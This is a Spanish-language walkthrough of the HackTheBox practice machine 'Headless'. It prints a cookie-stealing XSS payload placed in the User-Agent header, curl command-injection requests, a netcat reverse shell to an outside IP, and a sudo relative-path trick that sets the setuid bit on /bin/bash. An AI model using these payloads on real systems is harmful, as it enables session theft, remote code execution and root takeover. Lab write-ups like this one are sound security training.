## Headless — HackTheBox Writeup

---

### 📋 Información de la máquina

| Campo | Detalle |
| --- | --- |
| **Nombre** | Headless |
| **OS** | Linux |
| **Dificultad** | Easy |
| **Plataforma** | Hack The Box |
| **Técnicas** | XSS Cookie Stealing, Command Injection, sudo syscheck |

---

### 🔍 1. Enumeración — Nmap

bash

`nmap -sCV -p- --open -n -Pn -vvv -T5 IP -oN fullscan`

| Puerto | Servicio | Versión |
| --- | --- | --- |
| 22 | SSH | OpenSSH 9.2p1 |
| 5000 | HTTP | Werkzeug 2.2.2 Python 3.11.2 |

---

### 🌐 2. Enumeración Web

La web corre en Flask/Werkzeug en el puerto 5000. Tiene dos páginas:

- `/support` → formulario de contacto
- `/dashboard` → requiere autenticación (cookie `is_admin`)

---

### 🍪 3. XSS para robar cookie del admin

El formulario de `/support` detecta XSS en el body pero **no en los headers**. Cuando el admin revisa el reporte, los headers se renderizan en su navegador.

Levantamos servidor HTTP en Kali:

bash

`sudo python3 -m http.server 80`

Interceptamos la petición con Burp y modificamos el **User-Agent**:

`User-Agent: <script>var i=new Image(); i.src="http://TU_IP/?c="+document.cookie;</script>`

El admin abre el reporte → ejecuta el XSS → nos manda su cookie:

`is_admin=ImFkbWluIg.dmzDkZNEm6CK0oyL1fbM-SnXpH0`

---

### 💉 4. Command Injection en /dashboard

Con la cookie del admin accedemos al dashboard y explotamos el parámetro `date`:

### Confirmar RCE

bash

`curl -b "is_admin=ImFkbWluIg.dmzDkZNEm6CK0oyL1fbM-SnXpH0" -X POST \
--data-urlencode "date=2023-09-15;id" \
http://IP:5000/dashboard`

Resultado: `uid=1000(dvir)`

### User flag

bash

`curl -b "is_admin=ImFkbWluIg.dmzDkZNEm6CK0oyL1fbM-SnXpH0" -X POST \
--data-urlencode "date=2023-09-15;cat /home/dvir/user.txt" \
http://IP:5000/dashboard`

### Reverse shell

bash

`# Listener en Kali
nc -lvnp 4444

# Payload
curl -b "is_admin=ImFkbWluIg.dmzDkZNEm6CK0oyL1fbM-SnXpH0" -X POST \
--data-urlencode "date=2023-09-15;nc 10.10.14.58 4444 -e /bin/bash" \
http://IP:5000/dashboard`

---

### ⬆️ 5. Escalada de privilegios — syscheck

bash

`sudo -l
# (ALL) NOPASSWD: /usr/bin/syscheck`

El script `syscheck` ejecuta `./initdb.sh` desde el directorio actual si no existe. Creamos uno malicioso:

bash

`cd /tmp
echo '#!/bin/bash' > initdb.sh
echo 'chmod +s /bin/bash' >> initdb.sh
chmod +x initdb.sh
sudo /usr/bin/syscheck
/bin/bash -p`

Shell de root obtenida!

### Root flag

bash

`cat /root/root.txt`

---

### 📚 Lecciones aprendidas

- Los filtros XSS del body no siempre filtran los headers — probar `User-Agent`, `Referer`, etc.
- El XSS sin interacción directa puede funcionar si el admin revisa reportes automáticamente
- Command injection en parámetros de fecha es común en dashboards de administración
- Scripts sudo que ejecutan archivos relativos (`./`) son vectores de escalada si podemos escribir en el directorio actual

---

### 🛠️ Herramientas

| Herramienta | Uso |
| --- | --- |
| Nmap | Enumeración |
| Burp Suite Pro | Interceptación y modificación de headers |
| curl | Explotación command injection |
| Netcat | Reverse shell |
| Python HTTP Server | Recibir cookie del admin |
